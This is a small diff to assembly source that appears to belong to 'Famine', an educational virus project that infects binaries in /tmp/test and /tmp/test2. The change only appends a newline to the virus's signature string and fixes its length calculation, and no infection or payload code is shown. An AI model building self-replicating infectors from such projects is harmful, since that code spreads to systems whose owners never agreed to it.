@@ -119,6 +119,6 @@ proc_test:
 
 firstDir:       db "/tmp/test", 0
 secondDir:      db "/tmp/test2", 0
-signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>"
-signature_len:  equ $ - signature - 1
+signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 10
+signature_len:  equ $ - signature
 _end:
